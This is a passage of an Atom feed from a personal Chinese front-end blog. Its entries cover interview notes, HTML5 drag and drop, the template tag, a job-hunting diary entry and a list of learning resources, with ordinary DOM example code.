&lt;li&gt;DOMContentLoaded&lt;br&gt;DOMContentLoaded是html5中新加入的。就是为了是在domcontent加载完以及资源加载前的情况，就可以进行执行代码，减少延迟。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;7.页面中上传文件，不跳转页面&lt;br&gt;    提交到插入式框架、弹出式窗口来掩盖这个现象。这里就直接在页面中写iframe来作为提交的目标。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;form action=&amp;quot;./xxx.jsp&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot; method=&amp;quot;POST&amp;quot; target=&amp;quot;aa&amp;quot;&amp;gt;
    &amp;lt;input type=&amp;quot;file&amp;quot; name=&amp;quot;myfile&amp;quot; /&amp;gt;
    &amp;lt;input type=&amp;quot;submit&amp;quot; /&amp;gt;
&amp;lt;/form&amp;gt;

&amp;lt;iframe name=&amp;quot;aa&amp;quot; src=&amp;quot;&amp;quot; style=&amp;quot;display:none&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;##补充知识&lt;/p&gt;
&lt;p&gt;####document.querySelectorAll()与document.querySelector()&lt;/p&gt;
&lt;p&gt;DOM选择器，原生js操作元素获得元素，比jquery更加快。IE8也支持该方法，它接收的参数和 CSS 选择器完全一致。&lt;/p&gt;
&lt;p&gt;document.querySelectorAll()：返回一个包含该元素的数组，没有就返回空数组；&lt;br&gt;document.querySelector()：返回指定元素节点的子树中匹配selector的集合中的第一个，如果没有匹配，返回null。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;document.getElementById();
//代替使用
document.querySelector(&amp;quot;#test&amp;quot;);
document.querySelectorAll(&amp;quot;#test&amp;quot;)[0];
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;栗子：&lt;/p&gt;
&lt;p&gt;document 中选取 class 为 test 的 div 的子元素 p 的第一个子元素。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;document.querySelector(&amp;quot;div.test&amp;gt;p:first-child&amp;quot;);
document.querySelectorAll(&amp;quot;div.test&amp;gt;p:first-child&amp;quot;)[0];
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;##后记&lt;br&gt;这并不是标准答案，只是我自己在学习的过程中记录的笔记。如若有错，请指正。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;##概述&lt;br&gt;虽然有机会参加百度和腾讯的面试，但是结果并不是很理想。目前已经双双败下阵来。如果说很难也谈不上，就是一些常见的基础问题。其中腾讯在技术上更侧重于深度，而且特别喜欢问计算机网络的知识。而百度就是原生的js操作问题多一点。不过每一个问题还是特别有意思。&lt;/p&gt;
&lt;p&gt;##问题&lt;br&gt;1.Cookie与sessionID是怎么传送&lt;br&gt;Cookie是服务器在本地机器上存的一段文本。&lt;br&gt;Cookie对应字段Cookie:客户端传送&lt;br&gt;Set-cookie：服务器向客户端设置cookie&lt;br&gt;cookie的使用：是由浏览器按照一定的原则在后台自动发送给服务器，如果没有规定过期时间，就是浏览器会话期。这种一般存在内存中，而不是写在硬盘上。如果设置了过期时间，就写在硬盘上。&lt;br&gt;
    
    </summary>
    
      <category term="blog" scheme="http://zchub.cn/categories/blog/"/>
    
    
      <category term="interview" scheme="http://zchub.cn/tags/interview/"/>
    
      <category term="baidu" scheme="http://zchub.cn/tags/baidu/"/>
    
      <category term="tengxun" scheme="http://zchub.cn/tags/tengxun/"/>
    
  </entry>
  
  <entry>
    <title>html5-draggable</title>
    <link href="http://zchub.cn/2015/09/19/html5-draggable/"/>
    <id>http://zchub.cn/2015/09/19/html5-draggable/</id>
    <published>2015-09-19T10:01:33.000Z</published>
    <updated>2016-03-21T09:52:03.936Z</updated>
    
    <content type="html">&lt;p&gt;##概述&lt;br&gt;昨天去百度面试了，妥妥的接受了一波打击。再一次证明自己的基础是相当的不牢固，而且以前学习知识也有点浅尝辄止的感觉。学了新的东西就沾沾自喜，而现在一定要静下心来学习，多多发散思维。&lt;/p&gt;
&lt;p&gt;##定义&lt;br&gt;拖(drag)放(drop)，我们就围绕这两个字扩展。&lt;/p&gt;
&lt;p&gt;1.首先要允许拖元素。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;div draggable=&amp;quot;true&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2.允许传送数据&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;div id=&amp;quot;drag&amp;quot; draggable=&amp;quot;true&amp;quot; ondragstart=&amp;quot;drag(event)&amp;quot; &amp;gt;&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3.定义放置的位置&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;div id=&amp;quot;container&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;4.接受数据&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;div id=&amp;quot;container&amp;quot; ondragover=&amp;quot;dragover(event)&amp;quot; ondrop=&amp;quot;drop(event)&amp;quot;&amp;gt;&amp;lt;/div&amp;gt; 
//js目标元素中保存数据 
ev.target.appendChild(document.getElementById(data));
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;5.阻止本身事件&lt;br&gt;drop 事件的默认行为是以链接形式打开，则调用 preventDefault() 来避免浏览器对数据的默认处理。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ev.preventDefault();    
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;####涉及事件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;被拖动的元素发生顺序&lt;br&gt;  dragstart–&amp;gt;drag[持续发生]–dragend&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;dragstart:&lt;b&gt;拖动什么&lt;/b&gt;&lt;br&gt;  按下鼠标键并开始移动鼠标时，会在被拖放的元素上触发dragstart事件。但会出现一个有斜线的圆，表示不能将元素放置在现在的位置上。&lt;/li&gt;
&lt;li&gt;drag:&lt;b&gt;进行放置&lt;/b&gt;&lt;br&gt;  触发dragstart事件后，便触发。而且一直持续发生。&lt;/li&gt;
&lt;li&gt;dragover&lt;br&gt;  拖动停止时,即鼠标空开，即使元素没有移动。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;元素拖动到放置的位置发生顺序&lt;br&gt;  dragenter–&amp;gt;dragover[持续发生]–&amp;gt;dragleave或drop&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;dragenter:只要元素被拖动到放置目标上，就会触发dragenter事件&lt;/li&gt;
&lt;li&gt;dragover:&lt;b&gt;放到何处&lt;/b&gt;，如果被拖动的元素在放置目标的范围内移动时，就会持续触发该事件。若不在目标元素内，则停止该事件。但会触发dragleave事件。&lt;/li&gt;
&lt;li&gt;dragleave：元素离开目标元素时触发。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;##dataTransfer对象&lt;br&gt;为了在拖放操作时实现数据交换，IE 5引入了dataTransfer对象，它是事件对象的一个属性，用于从被拖动元素向放置目标传递&lt;b&gt;字符串格式&lt;/b&gt;的数据。&lt;/p&gt;
&lt;p&gt;####访问器与修改器&lt;br&gt;期间允许指定各种MIME类型。如“Text”与“URL”,但是会被映射为“text/plain”和“text/uri-list”。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;setData()&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;event.dataTransfer.setData(&amp;quot;Text&amp;quot;, &amp;quot;some text&amp;quot;);
event.dataTransfer.setData(&amp;quot;URL&amp;quot;, &amp;quot;HTML://www.w3cmm.com/&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;getData()&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;//获取文本数据
var dataTransfer = event.dataTransfer;
//读取URL
var url = dataTransfer.getData(&amp;quot;url&amp;quot;) || dataTransfer.getData(&amp;quot;text/uri-list&amp;quot;);
//读取文本
var text = edataTransfer.getData(&amp;quot;Text&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;###后续&lt;br&gt;栗子链接地址：&lt;a href=&quot;http://htmlpreview.github.io/?https://github.com/WangXiZhu/Learning_Demo/blob/master/html5_draggable/index.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;请戳这里&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;学习地址：&lt;a href=&quot;http://www.w3cmm.com/html/drag.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.w3cmm.com/html/drag.html&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;##概述&lt;br&gt;昨天去百度面试了，妥妥的接受了一波打击。再一次证明自己的基础是相当的不牢固，而且以前学习知识也有点浅尝辄止的感觉。学了新的东西就沾沾自喜，而现在一定要静下心来学习，多多发散思维。&lt;/p&gt;
&lt;p&gt;##定义&lt;br&gt;拖(drag)放(drop)，我们就围绕这两个字扩展。&lt;/p&gt;
&lt;p&gt;1.首先要允许拖元素。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;div draggable=&amp;quot;true&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2.允许传送数据&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;div id=&amp;quot;drag&amp;quot; draggable=&amp;quot;true&amp;quot; ondragstart=&amp;quot;drag(event)&amp;quot; &amp;gt;&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3.定义放置的位置&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;div id=&amp;quot;container&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="blog" scheme="http://zchub.cn/categories/blog/"/>
    
    
      <category term="html5" scheme="http://zchub.cn/tags/html5/"/>
    
      <category term="百度面试" scheme="http://zchub.cn/tags/%E7%99%BE%E5%BA%A6%E9%9D%A2%E8%AF%95/"/>
    
      <category term="drop" scheme="http://zchub.cn/tags/drop/"/>
    
      <category term="drag" scheme="http://zchub.cn/tags/drag/"/>
    
  </entry>
  
  <entry>
    <title>dairy-2015-09-13</title>
    <link href="http://zchub.cn/2015/09/14/dairy-2015-09-13/"/>
    <id>http://zchub.cn/2015/09/14/dairy-2015-09-13/</id>
    <published>2015-09-14T00:05:01.000Z</published>
    <updated>2016-03-21T09:52:03.936Z</updated>
    
    <content type="html">&lt;p&gt;##日记一则&lt;br&gt;今天又来吹哈夸夸。&lt;/p&gt;
&lt;p&gt;来了成都将近一个星期了。和“室友们”住在一起挺开心的。每天大家一起吃饭，睡觉（不要乱想哟!）,看书。说实话，&lt;br&gt;大家的压力都挺大，都是带着满满的希望来到这个看着熟悉又陌生的城市渴望找到一个实习的机会。&lt;/p&gt;
&lt;p&gt;来到这里，我现在比较遗憾的是有很长一段时间内没有写博客。而今天又和“室友们”一起和另外一波“工作小分队”聚了一下餐，其实是去蹭了一顿饭，在这里谢谢小伙伴的热情款待，我非常喜欢大家在一起的感觉，大家都谈了谈最近发生的事情，一起看火热的谍战片《伪装者》(其实我不是很爱好，比较费脑)。当然同时都抱怨了一下最近的笔试情况。虽然都不是很乐观，可大家心中都明白自己都要加把油。&lt;/p&gt;
&lt;p&gt;下面，说说自己的情况吧！&lt;/p&gt;
&lt;p&gt;还是和一个月前一样，复习知识，看看书。累了，听听音乐，说说段子。接下来，就是要面对美团的面试，我深深知道自己还没有准备好。但是我会尽自己最大的努力来补充自己的知识，毕竟还是以前欠下的帐，现在需要我自己来还，:(。ok，准备睡觉觉了！&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;##日记一则&lt;br&gt;今天又来吹哈夸夸。&lt;/p&gt;
&lt;p&gt;来了成都将近一个星期了。和“室友们”住在一起挺开心的。每天大家一起吃饭，睡觉（不要乱想哟!）,看书。说实话，&lt;br&gt;大家的压力都挺大，都是带着满满的希望来到这个看着熟悉又陌生的城市渴望找到一个实习的机会。&lt;/p&gt;
&lt;p&gt;
    
    </summary>
    
      <category term="生活日记" scheme="http://zchub.cn/categories/%E7%94%9F%E6%B4%BB%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="dairy" scheme="http://zchub.cn/tags/dairy/"/>
    
  </entry>
  
  <entry>
    <title>前端网站及资源分享</title>
    <link href="http://zchub.cn/2015/09/05/front-end-site-share/"/>
    <id>http://zchub.cn/2015/09/05/front-end-site-share/</id>
    <published>2015-09-05T01:28:56.000Z</published>
    <updated>2016-03-21T09:52:03.936Z</updated>
    
    <content type="html">&lt;p&gt;##说点废话[凑字数]&lt;br&gt;最近是在忙着准备找工作，每天也感觉自己忙得够呛。有时候甚至很晚才睡，很早就起了(对于我来说，嘻嘻！)。看了javascript也有一段时间了，可是感觉自己还是有点迷糊糊的。之前有看了阮一峰老师的一篇文章，不过存在很大的争议(附：不过我看了之后，还是觉得很有意思。可能有些概念自己也不知道，就当学习了)。&lt;/p&gt;
&lt;p&gt;所以我觉得学习好的东西是非常有必要的，这样可以让自己少走一点弯路。而自己这一段时间，也收藏了不少的文章和网站(估计是浏览器中分页太少了)，我觉得需要总结一下。&lt;/p&gt;
&lt;p&gt;##国外&lt;br&gt;首先还是说说歪果仁的！(毕竟这些玩意很多是人家的)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://stackoverflow.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;stackoverflow&lt;/a&gt;&lt;br&gt;这应该是大家熟知的，社区非常活跃，里面的人们都很有分析的精神。&lt;br&gt;Pi:上次我有个问题，就是在这个上面找到答案的！而且自己还到CSDN上装了一次逼！&lt;/li&gt;
&lt;/ul&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://github.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;github&lt;/a&gt;&lt;br&gt;托管网站，仓库。可以放300M的东东，好爽！(顿时觉得做程序员是幸福的,这么多免费的)，自己的博客，日记都可以放在上面。而且最好的是上面的东西是开源，可以向别人学习或进一步地合作。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://segmentfault.com/a/1190000002804472&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;github上值得关注的前端项目&lt;/a&gt;&lt;br&gt;资源多多的！&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/wangxizhu&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;自己fork的项目&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://bonsaiden.github.io/JavaScript-Garden/zh/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;JavaScript秘密花园&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://developer.mozilla.org/zh-CN/docs/Web/JavaScript&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;MDN&lt;/a&gt;&lt;br&gt;Mozilla Foundation，Mozilla基金会我觉得这个挺厉害的。上面的内容应有尽有。而且自己还可以参与这个社区中进行翻译。(pi:自己之前上去翻译过几百字，觉得可能会误人子弟，就觉着先多看看书，再继续闯荡江湖！)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://msdn.microsoft.com/zh-cn/library/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;MicroSoft&lt;/a&gt;&lt;br&gt;微软的，自己没怎么用过。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://www.w3.org/TR/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;W3C&lt;/a&gt;&lt;br&gt;标准，没得话说！&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://jsrocks.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;jsrocks&lt;/a&gt;&lt;br&gt;好像@hacke2龙哥之前翻译的文章就是这个网站的。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;##国内的&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://www.w3cfuns.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;w3cfuns&lt;/a&gt;&lt;br&gt;前端必备良站，牛人多多。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://www.html-js.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;前端乱炖&lt;/a&gt;&lt;br&gt;也不知道会炖成什么样，访问不是很多。不过是以前学姐推荐的。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://www.csdn.net/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;csdn&lt;/a&gt;&lt;br&gt;自己写点小东西最早在这上面，有社区提供支持。还可以下载很多资源。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://segmentfault.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;segmentfault&lt;/a&gt;&lt;br&gt;感觉很像国外的stackoverflow&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://code.ciaoca.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;前端开发仓库&lt;/a&gt;&lt;br&gt;有一些小东西，还比较好耍。&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://www.zhangxinxu.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;张鑫旭&lt;/a&gt;&lt;br&gt;比较geek,特别喜欢钻研。实干人物。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/TomXu/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;汤姆大叔&lt;/a&gt;&lt;br&gt;既会技术，又有管理能力。很是佩服。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;ruanyifeng.com&quot;&gt;阮一峰&lt;/a&gt;&lt;br&gt;非程序员，我认为却超过程序员。真正的勇士，希望在阮老师的身上多学习点品质。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://code.csdn.net/news/2821086&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;github牛人&lt;/a&gt;&lt;br&gt;今天仔细看了看，确实都是非凡的人物。也给了自己很多动力。特别是有的不但技术顶尖，而且精神生活也特别丰富。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;##IT公司团队&lt;/p&gt;
&lt;p&gt;首先当然是BAT咯&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://ued.taobao.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;阿里淘宝&lt;/a&gt;&lt;br&gt;作为“马帝国”旗下的大将，能文能武。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://efe.baidu.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;百度efe&lt;/a&gt;&lt;br&gt;内容丰富，技术全面，不可多得&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://fex.baidu.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;百度Web 前端研发部&lt;/a&gt;&lt;br&gt;看了之后，发现自己的弱小，真心想未来能成为其中的一员，与他们煮茶论道。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://www.alloyteam.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;腾讯全端 AlloyTeam 团队&lt;/a&gt;&lt;br&gt;人家的口号就是“成为地球卓越的Web团队”，这可不是说着玩的。真实力！前端可以多学习。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://qqfe.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;腾讯网前端团队&lt;/a&gt;&lt;br&gt;技术的内容不是很多。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://isux.tencent.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;腾讯ISUX&lt;/a&gt;&lt;br&gt;这个了不起，页面非常地炫，可以学习很多东西。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://www.75team.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;360奇舞团&lt;/a&gt;&lt;br&gt;更新的内容也不是很多。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;##其他&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://www.zhihu.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;知乎&lt;/a&gt;&lt;br&gt;可以在上面发表自己的观点。吐个槽什么的。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/h5bp/Front-end-Developer-Interview-Questions&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;前端面试题&lt;/a&gt;&lt;br&gt;这个还是很有必要的。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://pan.baidu.com/s/1jGhGikY&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;前端书籍集合&lt;/a&gt;&lt;br&gt;之前从同学那里保存下来的，觉得会有很用处。提取码：h862&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下面这些是自己用过或者是觉得还不错的小玩意。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://www.tuicool.com/articles/buaQjy&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;nodePPT&lt;/a&gt;&lt;br&gt;做出来的ppt,真的是狂拽炫酷吊炸天。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://www.webhek.com/css-preprocessor&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;webhek&lt;/a&gt;&lt;br&gt;小的应用，真的会点亮你的眼睛。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://mahua.jser.me/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;在线markdown编辑器&lt;/a&gt;&lt;br&gt;现在正在使用，你懂的。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;##总结&lt;br&gt;真心觉得自己撒也不会，就保存了一大堆的网站啊，或者其他资源。。。悲剧啊！&lt;br&gt;不过我还是希望向前面的人看齐，做一个有道德，有理想，有文化，有内涵的程序猿。哦，有的好的资源，会继续更新的，不过也欢迎大家补充，么么哒！&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;##说点废话[凑字数]&lt;br&gt;最近是在忙着准备找工作，每天也感觉自己忙得够呛。有时候甚至很晚才睡，很早就起了(对于我来说，嘻嘻！)。看了javascript也有一段时间了，可是感觉自己还是有点迷糊糊的。之前有看了阮一峰老师的一篇文章，不过存在很大的争议(附：不过我看了之后，还是觉得很有意思。可能有些概念自己也不知道，就当学习了)。&lt;/p&gt;
&lt;p&gt;所以我觉得学习好的东西是非常有必要的，这样可以让自己少走一点弯路。而自己这一段时间，也收藏了不少的文章和网站(估计是浏览器中分页太少了)，我觉得需要总结一下。&lt;/p&gt;
&lt;p&gt;##国外&lt;br&gt;首先还是说说歪果仁的！(毕竟这些玩意很多是人家的)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://stackoverflow.com/&quot;&gt;stackoverflow&lt;/a&gt;&lt;br&gt;这应该是大家熟知的，社区非常活跃，里面的人们都很有分析的精神。&lt;br&gt;Pi:上次我有个问题，就是在这个上面找到答案的！而且自己还到CSDN上装了一次逼！&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="blog" scheme="http://zchub.cn/categories/blog/"/>
    
    
      <category term="front-end" scheme="http://zchub.cn/tags/front-end/"/>
    
      <category term="扯淡" scheme="http://zchub.cn/tags/%E6%89%AF%E6%B7%A1/"/>
    
  </entry>
  
  <entry>
    <title>html5新标签data-*与template</title>
    <link href="http://zchub.cn/2015/09/04/html5-data-template/"/>
    <id>http://zchub.cn/2015/09/04/html5-data-template/</id>
    <published>2015-09-04T21:00:10.000Z</published>
    <updated>2016-03-21T09:52:03.936Z</updated>
    
    <content type="html">&lt;p&gt;##概述&lt;br&gt;首先这篇文章是由于看到 “script” 标签中引用了html内容，觉得甚是奇怪。在之前模模糊糊的印象中见过，但是但是也没有在意。不过今天在看微店[感觉又在打广告]的招聘网站的是否又看到了这个使用的方法，我觉得有必要学习一下。&lt;/p&gt;
&lt;p&gt;####举个栗子&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;script type=&amp;quot;text/template&amp;quot;  id=&amp;quot;test&amp;quot;&amp;gt;
    &amp;lt;div class=&amp;quot;title register&amp;quot;&amp;gt;
        &amp;lt;h1&amp;gt;姓名:&amp;lt;/h1&amp;gt;
        &amp;lt;h2&amp;gt;年龄:&amp;lt;/h2&amp;gt;
    &amp;lt;/div&amp;gt;
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;####使用方式&lt;br&gt;还是通过操作dom的形式来获取元素的内容&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;var test = document.getElementById(&amp;quot;test&amp;quot;).innerHTML;
document.write(test);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;####分析&lt;br&gt;由于script中的html代码不能直接显示，所以它在页面中的作用就相当于是模板(template)，不过我觉得在script脚本中来做这件事显得有点越俎代庖。那么有没有其他的方式呢？答案是有的。在html5中就有template标签，而它的作用就是这里说的模板。&lt;/p&gt;
&lt;p&gt;##html5的template&lt;br&gt;template是属于web components里面的规范。作用是可以将不必立即渲染的元素，不必立即执行的脚本放入这里。&lt;/p&gt;
&lt;p&gt;####举个栗子&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;
 // 数据在这里是硬编码，但是也可以访问服务器获得数据
    var data = [
       { name: &amp;apos;jack&amp;apos;, age: 20, sex: &amp;apos;Male&amp;apos;},
       { name: &amp;apos;rose&amp;apos;, age: 19, sex: &amp;apos;Female&amp;apos;},
    ];
&amp;lt;/script&amp;gt;

&amp;lt;table border=&amp;quot;1&amp;quot;&amp;gt;
    &amp;lt;thead&amp;gt;     
        &amp;lt;tr&amp;gt;
               &amp;lt;th&amp;gt;姓名 &amp;lt;th&amp;gt;年龄 &amp;lt;th&amp;gt;性别
    &amp;lt;/thead&amp;gt;
    &amp;lt;tbody&amp;gt;
        &amp;lt;template id=&amp;quot;row&amp;quot;&amp;gt;
               &amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/tr&amp;gt;
        &amp;lt;/template&amp;gt;
    &amp;lt;/tbody&amp;gt;
&amp;lt;/table&amp;gt;

&amp;lt;script&amp;gt;
    var template = document.querySelector(&amp;apos;#row&amp;apos;);
    for (var i = 0; i &amp;lt; data.length; i += 1) {
       var person = data[i];
       var clone = template.content.cloneNode(true);
       var cells = clone.querySelectorAll(&amp;apos;td&amp;apos;);
       cells[0].textContent = person.name;
       cells[1].textContent = person.age;
       cells[2].textContent = person.sex;
       template.parentNode.appendChild(clone);
    }
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里就是通过template标签来实现刚刚script中的功能，结果可谓是&lt;b&gt;完美！&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;###扩展&lt;br&gt;以往可能我们也使用过其他的模板语言，如freemarker,或者就是我们常用的html文档。html文档中就可以通过include来引入其它的文件。而 template 同样也是可以的。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;template id=&amp;quot;ulList&amp;quot;&amp;gt;
  &amp;lt;li&amp;gt;
    &amp;lt;strong&amp;gt;&amp;lt;%=content%&amp;gt;&amp;lt;/strong&amp;gt;
    &amp;lt;template&amp;gt;
      &amp;lt;div&amp;gt;
        &amp;lt;p&amp;gt;&amp;lt;%=detail%&amp;gt;&amp;lt;/p&amp;gt;
      &amp;lt;/div&amp;gt;
    &amp;lt;/template&amp;gt;            
  &amp;lt;/li&amp;gt;
&amp;lt;/template&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;###注意点&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;//通常获取内容方法
var clone = document.getElementById(&amp;quot;row&amp;quot;).content；

//实际上
var clone = template.content.cloneNode(true);
